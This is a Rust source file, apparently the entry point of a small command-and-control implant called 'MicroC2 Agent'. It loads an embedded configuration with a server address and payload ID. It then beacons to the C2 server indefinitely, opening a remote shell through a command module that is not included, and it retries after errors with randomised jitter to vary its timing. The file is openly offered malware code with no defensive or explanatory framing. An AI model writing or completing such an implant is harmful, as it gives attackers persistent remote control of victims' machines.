mod commands;
mod config;

use commands::command_shell::run_shell;
use config::AgentConfig;
use std::env;
use std::time::Duration;
use tokio::time;
use rand::Rng;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("[STARTUP] MicroC2 Agent starting...");
    
    let config = AgentConfig::load()?;
    let server_addr = env::args()
        .nth(1)
        .unwrap_or_else(|| config.get_server_url());
    
    let agent_id = config.payload_id.clone();
    println!("[INFO] Agent ID: {}", agent_id);
    println!("[INFO] Using embedded configuration");

    loop {
        println!("[NETWORK] Attempting connection to C2: {}", server_addr);
        if let Err(e) = run_shell(&server_addr, &agent_id).await {
            println!("[ERROR] Shell error: {}. Retrying...", e);
            // Add small delay after error before retrying
            time::sleep(Duration::from_secs(5)).await;
        }
        
        let mut rng = rand::thread_rng();
        let sleep_time = config.sleep_interval + rng.gen_range(0..config.jitter);
        time::sleep(Duration::from_secs(sleep_time)).await;
    }
}
